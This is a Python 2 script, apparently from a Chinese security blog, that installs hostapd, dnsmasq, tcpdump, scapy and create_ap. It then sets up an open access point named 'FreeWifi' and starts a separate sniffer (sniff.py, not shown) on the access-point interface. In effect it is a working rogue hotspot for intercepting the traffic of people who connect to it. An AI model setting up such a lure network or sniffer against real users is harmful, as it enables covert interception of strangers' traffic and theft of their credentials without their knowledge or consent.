#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

import subprocess
import time
import sys
import os

def checkInstall():
	if not os.path.isfile('/usr/sbin/hostapd'):
		install = raw_input('[?]  hostapd not found in /usr/sbin/hostapd, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install hostapd')
		else:
			sys.exit('[x] hostapd not found in /usr/sbin/hostapd')
	else:
		print '[√] hostapd has been installed.'

	if not os.path.isfile('/usr/sbin/dnsmasq'):
		install = raw_input('[?]  dnsmasq not found in /usr/sbin/dnsmasq, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install dnsmasq')
		else:
			sys.exit('[x] dnsmasq not found in /usr/sbin/dnsmasq')
	else:
		print '[√] dnsmasq has been installed.'

	if not os.path.isfile('/usr/sbin/rfkill'):
		install = raw_input('[?]  rfkill not found in /usr/sbin/rfkill, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install rfkill')
		else:
			sys.exit('[x] rfkill not found in /usr/sbin/rfkill')
	else:
		print '[√] rfkill has been installed.'

	if not os.path.isfile('/usr/sbin/haveged'):
		install = raw_input('[?]  haveged not found in /usr/sbin/haveged, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install haveged')
		else:
			sys.exit('[x] haveged not found in /usr/sbin/haveged')
	else:
		print '[√] haveged has been installed.'

	if not os.path.isfile('/usr/bin/gcc'):
		install = raw_input('[?]  dnsmap not found in /usr/bin/gcc, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install gcc')
		else:
			sys.exit('[x] gcc not found in /usr/bin/gcc')
	else:
		print '[√] gcc has been installed.'

	if not os.path.isfile('/usr/bin/make'):
		install = raw_input('[?] make not found in /usr/bin/make, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install make')
		else:
			sys.exit('[x] make not found in /usr/bin/make')
	else:
		print '[√] make has been installed.'

	if not os.path.isfile('/usr/sbin/tcpdump'):
		install = raw_input('[?] tcpdump not found in /usr/sbin/tcpdump, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install tcpdump')
		else:
			sys.exit('[x] tcpdump not found in /usr/sbin/tcpdump')
	else:
		print '[√] tcpdump has been installed.'

	if not os.path.isfile('/usr/bin/create_ap'):
		install = raw_input('[?] create_ap not found in /usr/bin/create_ap, install now? [y/n] ')
		if install == 'y':
			os.system('cd /tmp && git clone https://github.com/oblique/create_ap.git && cd create_ap && make install')
		else:
			sys.exit('[x] create_ap not found in /usr/bin/create_ap')
	else:
		print '[√] create_ap has been installed.'

	if not os.path.isfile('/usr/bin/pip') and not os.path.isfile('/usr/local/bin/pip'):
		install = raw_input('[?] pip not found, install now? [y/n] ')
		if install == 'y':
			os.system('cd /tmp && wget https://bootstrap.pypa.io/get-pip.py')
			os.system('python /tmp/get-pip.py')
		else:
			sys.exit('[x] pip not found')
	else:
		print '[√] pip has been installed.'

	try:
		__import__('scapy')
		print '[√] Module scapy been installed.'
	except:
		install = raw_input('[?] Module scapy not found in python, install now? [y/n] ')
		if install == 'y':
			os.system('pip install scapy')
		else:
			sys.exit('[x] No module named scapy')
	# update pip and python Modules

	print '[*] Update python modules.'
	print '-'*80

	try:
		os.system('pip install -U pip')
	except:
		sys.exit('[x] Update pip failed.')

	try:
		os.system('pip install -U scapy')
	except:
		sys.exit('[x] Update scapy failed.')

	try:
		os.system('pip install -U email')
	except:
		sys.exit('[x] Update email failed.')

def doCreate():
	try:
		os.system('create_ap %s %s %s %s %s -g %s --dhcp-dns %s --no-virt' % (mode,ap_iface,net_iface,ap_ssid,ap_key,ap_getway,ap_dns))
	except Exception,e:
		sys.exit('[x] Create AP failed! Please check!')

def dosniff():
	try:
		sniff_iface = ''
		if mode == '':
			sniff_iface = ap_iface
		else:
			sniff_iface = net_iface

		subprocess.Popen(['python',sys.path[0]+'/sniff.py',sniff_iface])
	except Exception,e:
		sys.exit('[x] do sniff failed.Exception is %s' % e)

if __name__ == '__main__':
	print "================================================="
	print "|Create by MonkeyChain			   	|"
	print "|Blog www.92ez.com Email non3gov@gmail.com	|"
	print "|You should know what you are doing.	  	|"
	print "================================================="

	global net_iface,ap_iface,ap_ssid,ap_key,ap_getway,ap_dns,mode

	net_iface = 'eth0'
	ap_iface = 'wlan0'
	ap_ssid = 'FreeWifi'
	ap_key = ''
	ap_getway = '192.168.0.1'
	ap_dns = '8.8.8.8'
	mode = ''

	if net_iface == '':
		mode = '-n'
	else:
		mode = ''

	print '\n[*] Checking required...\n'
	checkInstall()
	print '\n[*] Required checked!\n'

	print '[*] Start sniffing!'
	dosniff()

	print '[*] Creating an AP!'
	doCreate()